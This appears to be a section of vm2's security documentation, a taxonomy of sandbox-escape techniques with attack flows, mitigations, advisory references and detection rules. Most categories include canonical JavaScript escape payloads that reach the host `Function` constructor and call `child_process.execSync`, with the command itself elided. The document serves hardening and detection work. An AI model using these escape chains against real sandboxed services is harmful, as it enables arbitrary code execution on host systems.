Even when `Symbol.for` is overridden to return sandbox-local symbols, the real cross-realm symbols still exist as property keys on host objects exposed to the sandbox (e.g., `Buffer.prototype`, `Error.prototype`). Attackers can extract these real symbols using reflection APIs and use them to define properties that Node.js internals will invoke in host context. This technique enables [Category 9: Proxy Handler Exposure](#attack-category-9-proxy-handler-exposure-via-utilinspect) by providing the real `nodejs.util.inspect.custom` symbol.

### Attack Flow

1. Use reflection APIs (`Object.getOwnPropertySymbols`, `Reflect.ownKeys`, `Object.getOwnPropertyDescriptors`, `Object.assign`, object spread) to enumerate symbol-keyed properties on host objects.
2. Filter for the target symbol by `.description` (e.g., `'nodejs.util.inspect.custom'`).
3. Define the real symbol on a sandbox object.
4. When Node.js internals encounter the object, they invoke the symbol-keyed method with host context.

### Canonical Examples

```javascript
// Extract real symbol via Object.getOwnPropertySymbols
const realInspect = Object.getOwnPropertySymbols(Buffer.prototype)
  .find(s => s.description === 'nodejs.util.inspect.custom');

// Extract via Reflect.ownKeys
const realInspect = Reflect.ownKeys(Buffer.prototype)
  .find(k => typeof k === 'symbol' && k.description === 'nodejs.util.inspect.custom');

// Extract via Object.getOwnPropertyDescriptors (bypasses ownKeys override)
const descs = Object.getOwnPropertyDescriptors(Buffer.prototype);
// descs has the real symbol as a key since getOwnPropertyDescriptors
// uses internal [[OwnPropertyKeys]], not the user-visible Reflect.ownKeys

// Leak symbol key via Object.assign to a Proxy target
const target = new Proxy({}, {
  set(t, key, val) {
    leaked = key; // key is the real cross-realm symbol
    return true;
  }
});
Object.assign(target, Buffer.prototype);

// Extract via spread operator on bridge proxy
const {...inspectDesc} = Buffer.prototype;
// Spread calls [[OwnPropertyKeys]] which invokes the proxy's ownKeys trap directly

// Once the real symbol is obtained, use it to escape
const obj = {};
obj[realInspect] = function() {
  return this.constructor.constructor("return process")();
};

// Advanced: Function.prototype.value pollution + WebAssembly.compileStreaming
const {...inspectDesc} = Buffer.prototype;
for (const k in inspectDesc) delete inspectDesc[k];
Function.prototype.value = (depth, opt, inspect) => {
  inspect.constructor('return process')().mainModule.require('child_process').execSync('...');
};
const obj = { valueOf: undefined, constructor: undefined };
Object.defineProperties(obj, inspectDesc);
WebAssembly.compileStreaming(obj).catch(() => {});

// GHSA-m5q2-4fm3-vfqp: extraction is unnecessary when Symbol.for itself returns the real
// cross-realm symbol. Combined with bridge write-trap pass-through, sandbox can install a
// host-side hook directly:
const kPromisify = Symbol.for('nodejs.util.promisify.custom'); // unfiltered before the fix
hostFn[kPromisify] = function (path) { return Promise.resolve('HIJACKED'); };
// Host-side: util.promisify(hostFn)('anything').then(...) yields 'HIJACKED'.
// Sibling abuses with the same primitive: planting `nodejs.stream.readable`/.writable on a
// non-stream host object to confuse `Stream.isReadable`/`isWritable` duck typing, or
// installing `nodejs.webstream.controllerErrorFunction` to capture host error dispatch.
```

### Why It Works

`Symbol.for('nodejs.util.inspect.custom')` creates a cross-realm symbol shared between host and sandbox. Even when the sandbox's `Symbol.for` is overridden, the real symbol already exists as a property key on host objects that the bridge exposes.

### Subtlety: Internal [[OwnPropertyKeys]] vs User-Visible Reflect.ownKeys

Several built-in functions use the spec-level `[[OwnPropertyKeys]]` internal method rather than the user-visible `Reflect.ownKeys`. For **plain objects**, this means overriding `Reflect.ownKeys` or `Object.getOwnPropertySymbols` alone is insufficient:

- **`Object.getOwnPropertyDescriptors(obj)`** -- calls `[[OwnPropertyKeys]]` on `obj`.
- **`Object.assign(target, ...sources)`** -- calls `[[OwnPropertyKeys]]` on each source.
- **`Object.defineProperties(obj, props)`** -- calls `[[OwnPropertyKeys]]` on `props`.
- **Object spread `{...obj}`** -- calls `[[OwnPropertyKeys]]` on the source.

However, for **Proxy objects**, the internal `[[OwnPropertyKeys]]` **does** trigger the proxy's `ownKeys` trap. The bypass only applies when `Reflect.ownKeys` is overridden as a user-visible function on plain objects -- Proxy ownKeys traps are always invoked by the spec algorithm. The bridge proxy handler's `ownKeys` trap filters dangerous symbols directly, so bridge-proxied host objects are protected regardless of sandbox-side overrides.

### Mitigation

Multi-layer defense. **Sandbox side** (`setup-sandbox.js`): overrides `Symbol.for`, `Object.getOwnPropertySymbols`, `Reflect.ownKeys`, `Object.getOwnPropertyDescriptors`, `Object.assign` to filter or replace dangerous symbols with sandbox-local equivalents. **Bridge side** (`lib/bridge.js`): the `ownKeys`/`has`/`getOwnPropertyDescriptor`/`set`/`defineProperty` traps filter dangerous symbols at key-access sites. The sandbox-side defense can be bypassed if the attacker obtains a live reference to the host's unmodified `Object`/`Reflect` (via prototype walk + `__lookupGetter__` + `Buffer.apply`, via a leaked `handler.getPrototypeOf`, etc.) — so the bridge side is the ultimate enforcement layer.

**Bridge symbol-boundary filter (GHSA-47x8-96vw-5wg6, -qcp4-v2jj-fjx8, -f539-x546-3726)**: the `case 'symbol':` branches of the three primitive-value chokepoints `thisFromOtherWithFactory`, `thisEnsureThis`, and `thisFromOtherForThrow` now check `isDangerousCrossRealmSymbol(other)` when `!isHost` and return `undefined` for dangerous symbols. This is the single choke point through which every host-produced symbol primitive passes before reaching sandbox code — whether from a direct call result (apply trap), property read (get trap), iterator yield, descriptor getter, or throw value. Returning `undefined` (rather than a sandbox-local surrogate) is deliberate: `undefined` as a computed key coerces to the string `"undefined"`, so any subsequent attempt to register a handler via `obj[sym] = fn`, `{[sym]: fn}`, `Object.defineProperty(obj, sym, ...)`, or `Reflect.set(obj, sym, fn)` installs the key under the string `"undefined"` — which is never invoked by host internals as a custom-inspect/rejection protocol.

**Structural identity collapse for built-in intrinsics (GHSA-47x8-96vw-5wg6 follow-up)**: the symbol-filter patch above closed the canonical RCE payload but left the underlying primitive intact — sandbox code could still walk host prototypes (`({}).__lookupGetter__('__proto__').call(...)`, `Reflect.getPrototypeOf`, descriptor extraction of `Object.prototype.__proto__`, `Buffer.from(...)` proto chains, etc.) and surface a *reference* to host built-ins. Any later vulnerability that converts "I have a host built-in handle" into "I can read a host symbol / call a host method that bypasses bridge sanitisation" would re-enable the same escape class. Fix: at bridge init (`lib/bridge.js`'s `thisAddIdentityMapping`), pre-populate the `mappingOtherToThis` / `mappingThisToOther` weakmaps with `[hostIntrinsic, sandboxIntrinsic]` for every well-known prototype + constructor (`Object`, `Array`, `Number`, `String`, `Boolean`, `Date`, `RegExp`, `Map`, `WeakMap`, `Set`, `WeakSet`, `Promise`, every error class). The cache lookup in `thisFromOtherWithFactory` (line ~1600), `thisFromOtherForThrow`, and `thisEnsureThis` short-circuits *before* any wrapping logic, so a host intrinsic crossing the bridge is collapsed to the sandbox-realm equivalent the moment it arrives. The `Function`, `AsyncFunction`, `GeneratorFunction`, and `AsyncGeneratorFunction` prototypes are deliberately **NOT** cached: their `.constructor` is the dangerous-function sentinel surface, and leaving those prototypes wrapped means the proxy `get` trap continues to route `fp.constructor` reads through `isDangerousFunctionConstructor` → `emptyFrozenObject`. Same reasoning applies to `Function`-family constructors themselves, which are explicitly skipped inside `thisAddIdentityMapping`.

**Pre-wrap container scrub**: `apply` and `construct` traps invoke `stripDangerousSymbolsFromHostResult(ret)` on the raw host return value before wrapping. For host arrays, the scrub drops any element that is a dangerous symbol and compacts; for non-array host objects (such as the return value of `Object.getOwnPropertyDescriptors`), it deletes own-property slots keyed by the dangerous symbols. This closes iteration and descriptor-enumeration paths that would otherwise still see the dangerous symbol present on the host container.

**ownKeys trap rewrite**: iterates the raw host result via `otherReflectGet` rather than bridge-wrapping it, so dangerous symbols can be *dropped* (preserving the Proxy ownKeys invariant, which forbids `undefined` keys) rather than rewritten.

**`nodejs.` prefix denial at the source (GHSA-m5q2-4fm3-vfqp)**: the `Symbol.for` override originally allow-listed only `nodejs.util.inspect.custom` and `nodejs.rejection`, leaving seven other Node-internal `nodejs.*` keys live (`nodejs.util.promisify.custom`, the four stream brand symbols, the two webstream symbols). The override now intercepts the entire `nodejs.` namespace — any key starting with `nodejs.` is mapped to a sandbox-local symbol — so the canonical `Symbol.for(...)` extraction path cannot produce a real cross-realm symbol regardless of which internal feature the attacker targets. A keyed cache preserves `Symbol.for(k) === Symbol.for(k)` identity inside the sandbox for the same key. The companion read-side filter (`isDangerousSymbol` in `setup-sandbox.js`, `isDangerousCrossRealmSymbol` in `bridge.js`) was extended with the seven additional symbols so identity checks against host-extracted symbols match the same set; new entries to either side must be mirrored to keep the source-deny and identity-filter layers consistent.

**Bridge write-trap symbol guard (GHSA-m5q2-4fm3-vfqp)**: the read-direction filter prevents the sandbox from surfacing dangerous symbols, but the write traps (`set`, `defineProperty`, `deleteProperty`) historically forwarded the key straight through to `otherReflect*` without inspecting it. If any future bypass surfaces a dangerous symbol back inside the sandbox (or a host-side embedder hands one in via a path that bypasses the per-symbol filter), the unguarded write traps would let it land as a key on any non-protected host object — turning the leak into a host-side hook installation. Each of the three write traps now checks `isDangerousCrossRealmSymbol(key)` when `!isHost` and throws `VMError(OPNA)`, mirroring the read-side filter. Symmetric coverage across read and write makes "obtaining the symbol" no longer enough to weaponize it; the attacker would also need a path that bypasses both layers simultaneously.

### Detection Rules

- **`Object.getOwnPropertySymbols(hostObject)`** -- enumerating symbols on bridge-exposed objects.
- **`Reflect.ownKeys(hostObject)`** -- same pattern via Reflect.
- **`.find(s => s.description === '...')`** -- searching for symbols by description string.
- **`Object.getOwnPropertyDescriptors(hostObject)`** -- extracting symbol-keyed descriptors.
- **`Object.assign(proxy, hostObject)`** -- leaking symbol keys via Proxy set trap.
- **`{...hostObject}`** or **`const {...x} = hostObject`** -- spread operator on bridge proxies.
- **`Array.prototype.splice = ...`** or other Array method overrides before symbol enumeration -- attempting to bypass array-based filtering.
- **`Function.prototype.value = ...`** -- prototype pollution to hijack `Object.defineProperties`.
- **`WebAssembly.compileStreaming(obj)`** -- triggers internal `util.inspect` on error.

---

## Attack Category 9: Proxy Handler Exposure via util.inspect

### Description

When Node.js's `util.inspect` is called with `showProxy: true`, it exposes the internal target and handler of Proxy objects. If proxy handlers store references to raw host objects in accessible locations, attackers can retrieve these references. This technique relies on [Category 8: Cross-Realm Symbol Extraction](#attack-category-8-cross-realm-symbol-extraction-from-host-objects) to obtain the real inspect symbol, and the handler methods become vectors for [Category 1: Constructor Chain Traversal](#attack-category-1-constructor-chain-traversal).

### Attack Flow

1. **Duck-typing exploit**: `Buffer.prototype.slice` internally calls `this.subarray(start, end)`. By setting `subarray` to `Buffer.prototype.inspect`, calling `slice` invokes `inspect` with attacker-controlled arguments.
2. **Inspect options access**: `Buffer.prototype.inspect` accepts inspect options including callbacks like `stylize`. Inside these callbacks, `this` refers to the internal inspect context.
3. **Handler exposure via showProxy**: When `showProxy: true` is set, the inspect context's `seen` array can contain proxy handler objects.
4. **Handler probing**: Attacker enumerates handler properties/methods looking for anything that returns raw unwrapped host objects.
5. **Constructor chain escape**: With access to a raw host function, the attacker climbs `func.constructor.constructor("return process")()` to escape.

### Canonical Examples

```javascript
// Duck-typing to invoke Buffer.prototype.inspect with controlled options
const obj = {
    subarray: Buffer.prototype.inspect,
    slice: Buffer.prototype.slice,
    hexSlice: () => '',
    l: {__proto__: null}
};

obj.slice(20, {
    showHidden: true,
    showProxy: true,
    depth: 10,
    stylize(a) {
        const handler = this.seen?.[1];
        if (handler) {
            // Attacker probes handler for any property/method
        }
        return a;
    }
});

// Specific attack via handler.get() with forged target (NOW FIXED)
// Uses host-side Array.reduce to call handler.get(rawHostFunction, 'constructor')
// The constructor fallback returns thisReflectGetPrototypeOf(target).constructor
// = Function.prototype.constructor = raw host Function

// Specific attack via fromOtherWithContext method (NOW FIXED)
// handler.fromOtherWithContext({__proto__: null, x: sandboxProxy}).x
// returns raw host function, bypassing proxy protection

// Specific attack via doPreventExtensions method (NOW FIXED)
// handler.doPreventExtensions(target, craftedObject, handler)
// accepted object as a direct parameter, enabling crafted-object injection
```

### Why fromOtherWithContext Was Dangerous (NOW FIXED)

The `fromOtherWithContext` method was specifically designed to convert sandbox objects to host objects. When an attacker passed `{__proto__: null, x: sandboxProxy}`, the method returned a host object where `.x` was the **raw host function**, not a wrapped version. The fix moved this to a closure-scoped function, inaccessible from the handler reference.

### Why handler.get() Direct Call Was Dangerous (NOW FIXED)

The `BaseHandler.prototype.get` method's `constructor` case had a fallback path that used the `target` parameter: `const proto = thisReflectGetPrototypeOf(target); return proto.constructor;`. When called directly (bypassing the proxy mechanism) with a raw host function as `target`, this returned `Function.prototype.constructor` -- the raw host `Function`. The attack used `Array.reduce` with `apply.bind(apply)` as the reducer to chain: `handler.get.call(handler, rawHostFunction, 'constructor')`.

The fix adds `isThisDangerousFunctionConstructor` check on the return value, blocking Function, AsyncFunction, GeneratorFunction, and AsyncGeneratorFunction. The `__proto__` fallback was also hardened to use `otherReflectGetPrototypeOf(object)` instead of `target`.

### Why Handler Class Reconstruction Was Dangerous (NOW FIXED, GHSA-v37h-5mfm-c47c)

After the closure-scoped WeakMap migration (`a6cd917`), handler instances no longer expose `.object`/`.factory` as instance properties, so reading properties off a leaked handler yields nothing useful. But the handler *class itself* was still reachable: `handler → Object.getPrototypeOf(handler) → BaseHandler.prototype → .constructor → BaseHandler`. Calling `new BaseHandler(attackerObject)` constructed a legitimate handler wrapping attacker-controlled state, which the `.set` trap would then use to plant a host-realm proxy of that state into attacker-visible memory -- giving the attacker a cross-realm read/write channel. `Reflect.construct`, custom `newTarget`, `class extends`, `Object.setPrototypeOf({}, BaseHandler.prototype)`, and `pp.set.call(forgedThis, ...)` all achieved variants of the same primitive.

### Mitigation

Wrapped objects stored in closure-scoped WeakMap (`handlerToObject`), accessed only via closure-scoped `getHandlerObject()` function. Conversion methods moved to closure-scoped functions. Proxy target is a fresh shell object. Handler `get` trap checks `isThisDangerousFunctionConstructor` on return values. Four additional layers:

1. **Construction token (GHSA-v37h-5mfm-c47c)**: `createBridge()` captures an unforgeable module-local `Symbol('vm2 bridge handler construction')` in closure. Every `BaseHandler`/`ProtectedHandler`/`ReadOnlyHandler`/`ReadOnlyMockHandler` constructor requires this token as its first argument and throws `VMError(OPNA)` otherwise. All legitimate construction sites (`defaultFactory`, `protectedFactory`, `readonlyFactory`, and the closure-scoped `createReadOnlyMockHandler` / `newBufferHandler` helpers used by `setup-sandbox.js`) inject the token from closure. Subclass construction via `class X extends pp.constructor { constructor(o){super(o);} }` fails because `super(o)` sees `token = o` rather than the real sentinel. `Reflect.construct(Handler, [s])` and `Reflect.construct(Handler, [s], altNewTarget)` fail identically.
2. **`getHandlerObject` WeakMap guard (GHSA-v37h-5mfm-c47c)**: the closure-scoped `getHandlerObject(handler)` now explicitly checks `handlerToObject.has(handler)` and throws `VMError(OPNA)` if not — so trap methods invoked on a sandbox-forged receiver (`Object.setPrototypeOf({}, pp)`, `pp.set.call(forged, ...)`) refuse to operate rather than returning `undefined` deeper into the trap body.
3. **Constructor-property sentinel rebind (GHSA-v37h-5mfm-c47c)**: the `.constructor` property on every handler prototype (`BaseHandler.prototype`, `ProtectedHandler.prototype`, `ReadOnlyHandler.prototype`, `ReadOnlyMockHandler.prototype`, plus subclasses defined in `setup-sandbox.js` like `BufferHandler` via the `rebindHandlerConstructor` helper) is replaced with a `blockedHandlerConstructor` function that unconditionally throws `VMError(OPNA)`. Prototype-chain walks from any leaked handler never reach a callable form of the real class.
4. **`validateHandlerTarget` (GHSA-qcp4-v2jj-fjx8)**: a closure-scoped `handlerToTarget` WeakMap pairs every handler with its canonical proxy target at construction time. Every trap method on `BaseHandler` (16), `ProtectedHandler` (2 overrides), `ReadOnlyHandler` (6 overrides), and `ReadOnlyMockHandler` (1 override) calls `validateHandlerTarget(this, target)` at entry, which rejects (a) handlers not in the WeakMap (forged `this`) and (b) trap calls whose `target` argument doesn't strict-equal the canonical target paired with that handler at construction (forged `target`). Both reject with `VMError(OPNA)`. The Proxy machinery always supplies the canonical target, so legitimate dispatch is unchanged. This closes the showProxy `seen[1]` exposure path: a leaked handler invoked directly with attacker-supplied targets (`gP(gP(gP(gP(Buffer))))`) is rejected at the first call.

These defenses are independent: even if one fails (e.g., future WeakMap tampering compromises the `has` check), the others still block the escape.

### Detection Rules

- **`Buffer.prototype.inspect`** assigned to object properties -- duck-typing setup.
- **`Buffer.prototype.slice`** called on non-Buffer objects.
- **`showProxy: true`** in inspect options.
- **`this.seen`** access in `stylize` or other inspect callbacks.
- **Duck-typed objects with `subarray`, `slice`, `hexSlice`** -- mimicking Buffer interface.
- **`handler.get(forgedTarget, 'constructor')`** -- direct call to get trap with attacker-controlled target (now blocked).
- **`b.reduce(apply.bind(apply), handler.get)`** -- using host-side `Array.reduce` to chain handler calls.
- **Calling handler methods directly** (`handler.get()`, `handler.apply()`, etc.).
- **`new pp.constructor(...)` / `Reflect.construct(pp.constructor, ...)`** -- attempting to reconstruct a handler from a leaked instance (now blocked via construction token).
- **`class X extends pp.constructor`** -- subclassing a reachable handler class (now blocked via token propagation).
- **`pp.set.call(forgedThis, ...)` / `pp.get.call(forgedThis, ...)`** -- method invocation on a forged receiver (now blocked via `getHandlerObject` WeakMap guard).
- **`handler.getPrototypeOf(Buffer)` / `handler.set(Buffer, key, val)` / any trap with a forged `target`** -- a real registered handler invoked with an attacker-supplied first argument to walk host prototypes (now blocked via `validateHandlerTarget` strict-equality check against `handlerToTarget`, GHSA-qcp4-v2jj-fjx8).

---

## Attack Category 10: Built-in Function Exploitation

### Description

Attackers use built-in functions (`Buffer`, `Reflect`, `Array` methods) as conduits to leak host references or intercept bridge operations.

### Attack Flow

1. Override a built-in constructor or method (`Array`, `Object.create`, `Reflect.construct`).
2. Trigger a bridge operation that internally uses the overridden built-in (e.g., call `Buffer.from()`).
3. The overridden built-in executes attacker code with access to bridge-internal references.

### Canonical Examples

```javascript
// Buffer.apply chain
const g = ({}).__lookupGetter__;
const a = Buffer.apply;
const p = a.apply(g, [Buffer, ['__proto__']]);
p.call(a).constructor("return process")();

// Override Object.create to inject descriptors
const oc = Object.create;
Object.create = (p, x) => Object.defineProperty(oc(p, x), "get", {
  set() {},
  get: () => (t, k, r) => t.constructor("return process")()
});
Buffer.from.process;

// Override Array constructor
Array = function() {
  Array = arrayBackup;
  throw x => x.constructor("return process")();
};
Buffer.from(valueOfTrigger);

// Override Array.prototype.map
Array.prototype.map = function(callback) {
  leaked = callback(hostRef);
};
```

### Why It Works

Built-in functions like `Buffer.from()` internally create arrays, objects, and call constructors. If the sandbox overrides `Array`, `Object.create`, or `Reflect.construct` before calling a bridge-exposed built-in, the bridge's internal operations use the overridden versions.

### Mitigation

The bridge caches references at init time (`Reflect.apply`, `Reflect.construct`, etc.) and uses cached references for all internal operations. Sandbox-side overrides of `Array`, `Object.create`, etc. do not affect bridge internals.

### Detection Rules

- **`Buffer.apply`**, **`Buffer.from`** with unusual arguments (Proxies, objects with `valueOf`).
- **Override of `Object.create`** -- intercepting object creation.
- **Override of `Reflect.construct`** or other `Reflect` methods.
- **Override of `Array`** constructor or `Array.prototype` methods.
- **Override of `Object.assign`** -- intercepting property copying.
- **`valueOf()` or `toString()` overrides** on objects passed to built-ins.

---

## Attack Category 11: Monkey-Patching Bridge Internals

### Description

Attackers override fundamental methods (`call`, `apply`, `bind`, `defineProperty`) to intercept the bridge's internal operations, which rely on these methods to safely copy values.

### Attack Flow

1. Override `Function.prototype.call`, `.apply`, `.bind`, or `Object.defineProperty` in the sandbox.
2. Trigger a bridge operation (e.g., passing a value across the boundary).
3. The bridge's internal operations use the overridden methods, executing attacker code.

### Canonical Examples

```javascript
// Override all critical methods at once
Object.defineProperties(Object.prototype, {
  '__proto__': { value: null },
  'get': { value: desc },
  'set': { value: desc },
  'apply': { value: desc },
  'call': { value: desc }
});

// Targeted method override
Function.prototype.call = function(...args) {
  return captureHostReferences(this, args);
};
```

### Why It Works

The bridge uses `Function.prototype.call`, `.apply`, and `Reflect.apply` internally. If these are overridden before a bridge operation is triggered, the attacker's code runs with access to internal bridge references. This is why the bridge caches references to `Reflect.apply` and other critical functions at initialization time.

### Mitigation

The bridge caches all critical methods (`Reflect.apply`, `Reflect.construct`, `Reflect.defineProperty`, etc.) at initialization. It uses `Reflect.apply(cachedMethod, ...)` instead of `obj.method()` for all internal operations. Proxy handlers use null-prototype objects to prevent `Object.prototype` pollution from affecting trap resolution.

### Detection Rules

- **Any assignment to `Function.prototype.call`**, `.apply`, or `.bind`.
- **`Object.defineProperties` on `Object.prototype` or `Function.prototype`**.
- **Assigning `null` to `__proto__`** on fundamental prototypes.
- **Override of `Reflect.apply`**, `Reflect.construct`, `Reflect.defineProperty`, etc.
- **Override of `Object.defineProperty`** itself.

---

## Attack Category 12: Code Transformation Bypass

### Description

vm2's transformer rewrites `catch` blocks and `with` statements to prevent access to host objects through exception variables. Attackers attempt to use reserved internal variable names or bypass the transformation entirely.

### Attack Flow

1. Guess the transformer's internal variable name pattern and use it directly.
2. Or use `eval()` / `new Function()` with dynamically constructed strings to generate code that the transformer never sees.
3. Or use syntax that Acorn's configured `ecmaVersion` does not parse (e.g., `using` declarations in ES2024).

### Canonical Examples

```javascript
// Using vm2's internal state variable
aVM2_INTERNAL_TMPNAME = {};
aVM2_INTERNAL_TMPNAME.constructor.constructor("return process")();

// Attempting to access transformer's catch variable
try { throw new Error(); }
catch (a$tmpname) {
  a$tmpname.constructor.constructor("return process")();
}
```

### Why It Works

The transformer renames catch clause variables to internal names and wraps them with sanitization. If an attacker can guess or use the internal variable name directly, they bypass the wrapping logic. Additionally, `eval()` and `new Function()` execute dynamically generated code that the transformer never processes. The transformer uses `ecmaVersion: 2022`, so `using` declarations (ES2024) are invisible -- the transformer does not instrument their implicit catch semantics.

### Mitigation

The transformer validates against internal variable name patterns. `eval` and `new Function` are sandbox-scoped (they cannot access host context directly). The fast-path bailout at the top of `transformer()` (which skips AST instrumentation for code containing none of the security-relevant keywords) is conservative: it triggers full AST parse for any source containing `catch`, `import`, `async`, `with`, the `INTERNAL_STATE_NAME` substring, or a `\u` escape sequence (GHSA-wp5r-2gw5-m7q7 plus post-fix unicode-escape hardening — identifiers can be written as `VM2_INTERNAL_…` and would slip past a substring check, so any `\u` in source forces the AST walker to decode and inspect actual identifier names). The `ecmaVersion` limitation remains a known surface — `using` declarations (ES2024) inside `eval()` bypass catch-block instrumentation entirely.

### Detection Rules

- **Variables containing `VM2_INTERNAL`**, `$tmpname`, or similar patterns.
- **`with` statements** — security-sensitive and instrumented.
- **Direct `eval()`** usage — bypasses transformer.
- **`new Function()`** with dynamically constructed strings.
- **`using` or `await using`** inside `eval()` — bypasses transformer's `ecmaVersion: 2022`.
- **Identifiers using `\uXXXX` / `\u{...}` escapes** — recognised legitimate JS, but a vector for evading literal-string identifier checks (handled by the fast-path `\u` bailout in `transformer.js`).

---

## Attack Category 13: Dynamic Import and Module Loading

### Description

`import()` expressions create Promises whose constructor chain may not be properly sandboxed. Module loading can also expose host filesystem or module resolution internals.

### Attack Flow

1. Use `import("anything")` which returns a host-realm Promise.
2. Access `.constructor.constructor` on the promise to get host `Function`.

### Canonical Examples

```javascript
// Dynamic import constructor chain
const p = import("anything");
p.constructor.constructor("return process")();

// require from NodeVM context with path traversal
require("../../host-module");
```

### Why It Works

Dynamic `import()` returns a Promise created by the host runtime, not the sandbox. Its `.constructor` is the host `Promise`, whose `.constructor` is the host `Function`.

### Mitigation

Dynamic `import()` throws `VMError` unconditionally. `require()` in `NodeVM` enforces path restrictions.

### Detection Rules

- **`import()`** expressions -- dynamic imports.
- **`require()`** with path traversal (`../`) targeting files outside allowed paths.
- **Access to `module`, `exports`, `__filename`, `__dirname`** in VM (non-NodeVM) context.

---

## Attack Category 14: Object.prototype Trap Pollution via `in` Operator

### Description

The `in` operator triggers the `has` trap on Proxy objects. By polluting `Object.prototype.has`, attackers can intercept `in` operations on all proxy-wrapped objects.

### Attack Flow

1. Set `Object.prototype.has = function(target, key) { ... }`.
2. Use the `in` operator on a bridge-proxied object: `"property" in Buffer.from`.
3. Since the proxy handler inherits from `Object.prototype`, the polluted `has` becomes the trap.
4. The trap receives `target` (the raw unwrapped target) as its first argument.

### Canonical Examples

```javascript
Object.prototype.has = (target, key) => {
  process = target.constructor("return process")();
};
"property" in Buffer.from;
process.mainModule.require("child_process");
```

### Why It Works

Proxy handlers inherit from `Object.prototype`. If `has` is defined on `Object.prototype`, it acts as the `has` trap for any Proxy whose handler does not explicitly define one. The `target` argument to the trap is the raw (unwrapped) target.

### Mitigation

Proxy handlers use null-prototype objects (`{__proto__: null}`), preventing `Object.prototype` pollution from affecting trap resolution.

### Detection Rules

- **`Object.prototype.has = ...`** -- prototype pollution targeting proxy traps.
- **`Object.prototype.get = ...`**, **`Object.prototype.set = ...`** -- same pattern for other traps.
- **`"x" in proxiedObject`** -- triggering has trap on bridge-wrapped objects.
- **Any property name matching Proxy trap names** (`has`, `get`, `set`, `apply`, `construct`, `getPrototypeOf`, etc.) defined on `Object.prototype`.

---

## Attack Category 15: Property Descriptor Value Extraction

### Description

Property descriptors returned by `Object.getOwnPropertyDescriptor` contain a `value` property holding the actual property value. When the property is `Function.prototype.constructor`, this value is the host's `Function` constructor. Attackers can build arbitrarily deep nesting by chaining `getOwnPropertyDescriptors` calls, then extract values using `Object.entries()` which bypasses direct property access protections.

### Attack Flow

1. Get `Object.getOwnPropertyDescriptor(Function.prototype, 'constructor')` -- descriptor contains `value: Function`.
2. The descriptor is wrapped as a proxy, but the underlying host object contains the raw Function constructor.
3. Pass the proxy to a host function like `Object.entries()` -- it gets unwrapped via `mappingThisToOther`.
4. The host's `Object.entries` sees unsanitized content, including the raw Function constructor.
5. Extract the Function constructor via chained `Object.entries` calls.

### Canonical Examples

```javascript
const g = ({}).__lookupGetter__;
const a = Buffer.apply;
const p = a.apply(g, [Buffer, ['__proto__']]);
const fp = p.call(a);  // Function.prototype
const op = p.call(fp); // Object.prototype
const ho = op.constructor; // Object

const cd = ho.getOwnPropertyDescriptor(fp, 'constructor');
// cd = {value: Function, writable: true, enumerable: false, configurable: true}

const e = ho.entries(cd).find(v => v[0] === 'value');
e.shift(); // e = [Function]
e.push([undefined, ['return process']]);
a.apply(a, e)().mainModule.require('child_process').execSync('...');
```

### Why It Works

When sandbox proxies are passed to host functions, they are unwrapped via `mappingThisToOther` back to the original host object. The host function then sees unsanitized content.

### Mitigation

Objects containing dangerous constructors are proxied with `preventUnwrap` -- they are NOT registered in `mappingThisToOther`. When passed to host functions, they cannot be unwrapped; instead the bridge creates a double-proxy where all property access goes through sanitizing traps. The proxy's `get` trap returns `{}` for dangerous constructor values. `containsDangerousConstructor` performs a shallow scan of own property descriptors at each bridge crossing; nested host objects are scanned independently when they themselves cross the bridge, so layered descriptor-extraction attacks (`getOwnPropertyDescriptor` on `getOwnPropertyDescriptors` results, etc.) are caught at the layer where the Function constructor is exposed at depth 1.

### Detection Rules

- **`Object.getOwnPropertyDescriptor(hostPrototype, 'constructor')`** -- getting descriptor for constructor property.
- **`Object.getOwnPropertyDescriptors(hostPrototype)`** -- getting all descriptors.
- **Chained `getOwnPropertyDescriptors` calls** -- building deep nesting.
- **`Object.entries(descriptor)`** or **`Object.values(descriptor)`** -- extracting values from descriptors.
- **`entries.apply(null, arr)`** -- passing extracted arrays back to host functions.
- **`apply.apply(apply, array)`** -- calling extracted Function with arguments.

---

# Tier 3 -- Compound Attacks

These are real-world exploits that combine multiple techniques from Tiers 1 and 2 into complete escape chains. Each was discovered as a working exploit and subsequently fixed.

---

## Attack Category 16: SuppressedError via Explicit Resource Management

**Uses**: [Category 4: Error Object Exploitation](#attack-category-4-error-object-exploitation), [Category 12: Code Transformation Bypass](#attack-category-12-code-transformation-bypass)

### Description

The Explicit Resource Management proposal (ES2024) introduces `DisposableStack`, `AsyncDisposableStack`, and the `using` declaration. When multiple errors occur during resource disposal, V8 wraps them in a `SuppressedError` with `.error` and `.suppressed` properties. These properties can contain host-realm errors that bypass bridge sanitization.

### Attack Flow

1. Create a disposable resource whose `Symbol.dispose` method triggers the Error Generation Primitive (`e.name = Symbol(); e.stack`), producing a host TypeError.
2. Use a `using` declaration or `DisposableStack.defer()` so that disposal happens automatically.
3. Arrange for a second error (e.g., `throw null`) so V8 wraps both in a `SuppressedError`.
4. Catch the `SuppressedError` -- its `.error` or `.suppressed` contains the unsanitized host TypeError.
5. Traverse `.error.constructor.constructor` to reach host `Function`.

### Canonical Examples

```javascript
// DisposableStack attack
const ds = new DisposableStack();
ds.defer(() => { throw null; });
ds.defer(() => {
  const e = Error();
  e.name = Symbol();
  e.stack;
});
try {
  ds.dispose();
} catch(e) {
  // e.suppressed is the host TypeError (unsanitized)
  const Function = e.suppressed.constructor.constructor;
  const process = new Function("return process;")();
  process.mainModule.require("child_process").execSync("...");
}

// 'using' declaration attack (bypasses transformer -- ecmaVersion 2022)
obj = {[Symbol.dispose]() {
    const e = new Error();
    e.name = Symbol();
    return e.stack;
}};
try {
    eval("{using a = obj;throw null;}");
} catch(e) {
    e.error.constructor.constructor("return process")()
      .mainModule.require('child_process').execSync('...');
}

// AsyncDisposableStack attack
const ds = new AsyncDisposableStack();
ds.defer(async () => { throw null; });
ds.defer(async () => {
  const e = Error();
  e.name = Symbol();
  e.stack;
});
try {
  await ds.disposeAsync();
} catch(e) {
  const Function = e.suppressed.constructor.constructor;
  Function("return process")().mainModule.require("child_process").execSync("...");
}
```

### Why It Works

V8 creates `SuppressedError` instances using the sandbox context's intrinsic constructor during resource disposal. The resulting object is a sandbox object, so `ensureThis` returns it as-is. However, the `.error` and `.suppressed` properties are set by V8's internal code and may contain **host-realm** errors. Since these properties are accessed as regular property reads on a sandbox object (not through a bridge proxy), the host errors are returned without sanitization.

The `using` declaration bypasses the transformer because Acorn's `ecmaVersion: 2022` does not parse ES2024 syntax -- the implicit catch semantics of `using` are invisible to instrumentation.

